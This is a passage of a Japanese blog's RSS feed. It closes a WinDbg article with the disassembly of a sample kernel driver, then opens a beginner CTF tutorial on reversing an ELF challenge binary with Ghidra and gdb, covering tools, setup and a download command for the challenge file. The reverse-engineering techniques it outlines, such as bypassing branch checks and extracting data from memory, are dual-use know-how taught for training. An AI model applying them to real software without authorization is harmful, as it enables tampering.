   16 fffff800`64521052 48894868        mov     qword ptr &lt;span class=&quot;token namespace&quot;&gt;[rax+68h]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;rcx
   19 fffff800`64521056 c744242000000000 mov     dword ptr &lt;span class=&quot;token namespace&quot;&gt;[rsp+20h]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;0
   20 fffff800`6452105e c74424301c010000 mov     dword ptr &lt;span class=&quot;token namespace&quot;&gt;[rsp+30h]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;11Ch
   21 fffff800`64521066 488d4c2430      lea     rcx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token namespace&quot;&gt;[rsp+30h]&lt;/span&gt;
   21 fffff800`6452106b ff158f0f0000    call    qword ptr &lt;span class=&quot;token namespace&quot;&gt;[FirstDriverSample!_imp_RtlGetVersion (fffff800`64522000)]&lt;/span&gt;
   21 fffff800`64521071 89442420        mov     dword ptr &lt;span class=&quot;token namespace&quot;&gt;[rsp+20h]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;eax
   23 fffff800`64521075 488d0d74010000  lea     rcx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;FirstDriverSample! ?? ::FNODOBFM::`string&lt;span class=&quot;token string&quot;&gt;&apos; (fffff800`645211f0)]
   23 fffff800`6452107c e876000000      call    FirstDriverSample!DbgPrint (fffff800`645210f7)
   24 fffff800`64521081 448b4c243c      mov     r9d,dword ptr [rsp+3Ch]
   24 fffff800`64521086 448b442438      mov     r8d,dword ptr [rsp+38h]
   24 fffff800`6452108b 8b542434        mov     edx,dword ptr [rsp+34h]
   24 fffff800`6452108f 488d0d7a010000  lea     rcx,[FirstDriverSample! ?? ::FNODOBFM::`string&apos;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fffff800`64521210&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
   24 fffff800`64521096 e85c000000      call    FirstDriverSample!DbgPrint &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fffff800`645210f7&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
   26 fffff800`6452109b 33c0            xor     eax&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;eax
   27 fffff800`6452109d 488b8c2450010000 mov     rcx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;qword ptr &lt;span class=&quot;token namespace&quot;&gt;[rsp+150h]&lt;/span&gt;
   27 fffff800`645210a5 4833cc          xor     rcx&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;rsp
   27 fffff800`645210a8 e823000000      call    FirstDriverSample!__security_check_cookie &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;fffff800`645210d0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
   27 fffff800`645210ad 4881c468010000  add     rsp&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;168h
   27 fffff800`645210b4 c3              ret&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;今回は特に動きのあるカーネルドライバではないのでいったんここで終了します。&lt;/p&gt;
&lt;p&gt;次回以降では、実際に自作のドライバに対してライブデバッグを仕掛けていこうと思います。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;カーネルモードデバッグの検証のために、カーネルドライバの開発を始めました。&lt;/p&gt;
&lt;p&gt;WinDbg関連記事はこちらにまとめてあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[【CTF入門】ELFバイナリのリバースエンジニアリングに入門してみよう]]></title><link>https://kashiwaba-yuki.com/ctf-elf-training</link><guid isPermaLink="false">https://kashiwaba-yuki.com/ctf-elf-training</guid><pubDate>Sun, 12 Dec 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;CTFの初心者向けにELFバイナリの基本的な解析手法を解説します。&lt;/p&gt;
&lt;p&gt;この記事は、私が個人的に開催する勉強会の資料として作成しました。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%AE%E7%9B%AE%E7%9A%84&quot;&gt;この記事の目的&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%AF%BE%E8%B1%A1%E8%80%85&quot;&gt;対象者&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E4%BA%8B%E5%89%8D%E6%BA%96%E5%82%99&quot;&gt;事前準備&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%95%8F%E9%A1%8C%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%80%E3%82%A6%E3%83%B3%E3%83%AD%E3%83%BC%E3%83%89&quot;&gt;問題ファイルのダウンロード&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E8%A1%A8%E5%B1%A4%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot;&gt;表層解析を行う&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#file&quot;&gt;file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#strings&quot;&gt;strings&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#readelf&quot;&gt;readelf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot;&gt;バイナリを実行してみる&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#elf%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%A8%E3%81%AF&quot;&gt;ELFファイルとは&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%AE%9F%E8%A1%8C%E6%A8%A9%E9%99%90%E3%82%92%E4%B8%8E%E3%81%88%E3%82%8B&quot;&gt;実行権限を与える&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E9%9D%99%E7%9A%84%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot;&gt;静的解析を行う&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#radare2&quot;&gt;radare2&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#ghidra%E3%81%A7main%E9%96%A2%E6%95%B0%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%99%E3%82%8B&quot;&gt;Ghidraでmain関数を解析する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A6%8B%E3%81%A4%E3%81%91%E3%82%8B&quot;&gt;エントリポイントを見つける&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#rva--va--offset%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;RVA / VA / Offsetについて&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%8B%E3%82%89main%E9%96%A2%E6%95%B0%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;エントリポイントからmain関数を特定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#main%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E7%B5%90%E6%9E%9C%E3%82%92%E8%A6%8B%E3%82%8B&quot;&gt;main関数のデコンパイル結果を見る&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%A8%99%E6%BA%96%E5%85%A5%E5%8A%9B%E3%81%AE%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8A&quot;&gt;標準入力の受け取り&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%94%B9%E8%A1%8C%E6%96%87%E5%AD%97%E3%81%AE%E5%89%8A%E9%99%A4&quot;&gt;改行文字の削除&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%AB%E3%83%BC%E3%83%97%E5%87%A6%E7%90%86%E3%81%A7%E6%96%87%E5%AD%97%E5%88%97%E3%82%92xor%E6%9A%97%E5%8F%B7%E5%8C%96&quot;&gt;ループ処理で文字列をXOR暗号化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%95%E3%82%8C%E3%81%9F%E3%83%90%E3%82%A4%E3%83%88%E5%88%97%E3%82%92%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%81%99%E3%82%8B&quot;&gt;暗号化されたバイト列をチェックする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%83%BC%E3%82%BF%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%80%A4%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;データセクションの値を取得する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#xor%E6%9A%97%E5%8F%B7%E5%8C%96%E6%99%82%E3%81%AE%E9%96%A2%E6%95%B0%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%99%E3%82%8B&quot;&gt;XOR暗号化時の関数を解析する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ida-free%E3%82%92%E4%BD%BF%E3%81%86&quot;&gt;IDA Freeを使う&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#xor%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%AE%E6%8C%99%E5%8B%95%E3%82%92%E8%A6%8B%E6%8A%9C%E3%81%8F&quot;&gt;XOR暗号化の挙動を見抜く&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#gdb%E3%81%A7%E5%8B%95%E7%9A%84%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot;&gt;gdbで動的解析を行う&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#gdb%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;gdbのロードアドレスを特定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;ブレークポイントを設定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ghidra%E3%81%AE%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%83%99%E3%83%BC%E3%82%B9%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B&quot;&gt;Ghidraのイメージベースを変更する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#gdb%E3%81%A7%E3%82%88%E3%81%8F%E4%BD%BF%E3%81%86%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E4%B8%80%E9%83%A8%E3%81%AE%E3%81%BF&quot;&gt;gdbでよく使うコマンド(一部のみ)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%A7%A3%E6%9E%90%E3%81%AE%E6%96%B9%E9%87%9D%E3%82%92%E7%AB%8B%E3%81%A6%E3%82%8B&quot;&gt;解析の方針を立てる&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#x86_64%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E3%81%AE%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;x86_64アーキテクチャのレジスタについて&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E9%96%A2%E6%95%B0%E3%81%AE%E6%88%BB%E3%82%8A%E5%80%A4%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;関数の戻り値を特定する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#gdb%E3%82%92%E8%87%AA%E5%8B%95%E5%8C%96%E3%81%99%E3%82%8B&quot;&gt;gdbを自動化する&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#gdb-python%E3%82%92%E4%BD%BF%E3%81%86&quot;&gt;gdb-pythonを使う&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#flag%E5%8F%96%E5%BE%97&quot;&gt;Flag取得&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%BE%E3%81%91%E3%82%88%E3%81%8F%E4%BD%BF%E3%81%86gdb%E3%81%AE%E3%83%86%E3%82%AF%E3%83%8B%E3%83%83%E3%82%AF&quot;&gt;おまけ：よく使うgdbのテクニック&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#efrags%E3%82%92%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88%E3%81%A6%E6%9D%A1%E4%BB%B6%E5%88%86%E5%B2%90%E3%82%92%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9%E3%81%99%E3%82%8B&quot;&gt;EFRAGSを書き換えて条件分岐をバイパスする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E4%B8%AD%E3%81%8B%E3%82%89%E6%83%85%E5%A0%B1%E3%82%92%E6%8A%9C%E3%81%8D%E5%87%BA%E3%81%99&quot;&gt;メモリの中から情報を抜き出す&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%81%8A%E3%81%99%E3%81%99%E3%82%81%E3%81%AE%E6%9B%B8%E7%B1%8D--web%E3%82%B5%E3%82%A4%E3%83%88&quot;&gt;おすすめの書籍 / WEBサイト&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%9B%B8%E7%B1%8D&quot;&gt;書籍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#web%E3%82%B5%E3%82%A4%E3%83%88&quot;&gt;WEBサイト&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;この記事の目的&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%AE%E7%9B%AE%E7%9A%84&quot; aria-label=&quot;この記事の目的 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;この記事の目的&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;バイナリ解析に興味がある入門者向けに、GDBやGhidraを使ったELFバイナリの解析手法を紹介します&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;対象者&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%AF%BE%E8%B1%A1%E8%80%85&quot; aria-label=&quot;対象者 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;対象者&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CTFやバイナリ解析に興味がある&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;コンピュータアーキテクチャやELFファイルに関する基礎知識がある&lt;/p&gt;
&lt;p&gt;※ この記事はGDBやGhidraの使い方にフォーカスするため、基礎事項に関する詳細な解説は行いません。&lt;/p&gt;
&lt;p&gt;※ CやPythonが雰囲気で読める、CPUやレジスタ、メモリなどの用語と主な用途を知っている、Linuxシステムの環境構築を独力で行える、くらいのレベル感を想定してます&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;事前準備&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BA%8B%E5%89%8D%E6%BA%96%E5%82%99&quot; aria-label=&quot;事前準備 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;事前準備&lt;/h2&gt;
&lt;p&gt;x86_64プラットフォームのLinux環境で、以下のアプリケーションをインストールしておく必要があります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ghidra-sre.org/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Ghidra&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://hex-rays.com/ida-free/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;IDA Free&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gnu.org/software/gdb/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;gdb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/longld/peda&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;gdb-peda&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/radareorg/radare2/releases&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;radare2&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;この記事の手順は以下の環境で再現していますが、アプリケーションのバージョンについては多少差異があっても特に問題ないと思います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# 環境&lt;/span&gt;
Ubuntu20.04 64bit
Ghidra &lt;span class=&quot;token number&quot;&gt;10.1&lt;/span&gt;-BETA
IDA Free &lt;span class=&quot;token number&quot;&gt;7.6&lt;/span&gt;
gdb &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Ubuntu &lt;span class=&quot;token number&quot;&gt;9.2&lt;/span&gt;-0ubuntu1~20.04&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;9.2&lt;/span&gt;
radare2 &lt;span class=&quot;token number&quot;&gt;4.2&lt;/span&gt;.1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;radare2とIDAFreeは一応インストールしてますが、軽く紹介する程度にとどめるのでインストールしなくても問題はないです。&lt;/p&gt;
&lt;h3 id=&quot;問題ファイルのダウンロード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%95%8F%E9%A1%8C%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%80%E3%82%A6%E3%83%B3%E3%83%AD%E3%83%BC%E3%83%89&quot; aria-label=&quot;問題ファイルのダウンロード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;問題ファイルのダウンロード&lt;/h3&gt;
&lt;p&gt;この記事で使用するバイナリは以下からダウンロードできます。&lt;/p&gt;
&lt;p&gt;問題バイナリ：&lt;a href=&quot;/file/revvy_chevy&quot;&gt;revvy_chevy&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Description&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; Flag, &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; Flag, Red Flag, Blue Flag. Encrypting flags is as easy as making a rhyme&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;なお、MetaCTFの運営にコンタクトを取り、MetaCTFのURLを記事に記載することを条件にこちらのブログでの問題バイナリの再配布について快諾いただいております。&lt;/p&gt;
&lt;p&gt;CTFリンク：&lt;a href=&quot;https://metactf.com/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;MetaCTF | Cybersecurity Capture the Flag Competition&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;もし再々配布を検討される場合は、忘れずに上記リンクを記載いただければと思います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;wget&lt;/span&gt; https://kashiwaba-yuki.com/file/revvy_chevy&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Linux環境で上記のコマンドを実行して問題バイナリをダウンロードしてください。&lt;/p&gt;
&lt;p&gt;それでは、さっそく解析を始めていきましょう。&lt;/p&gt;
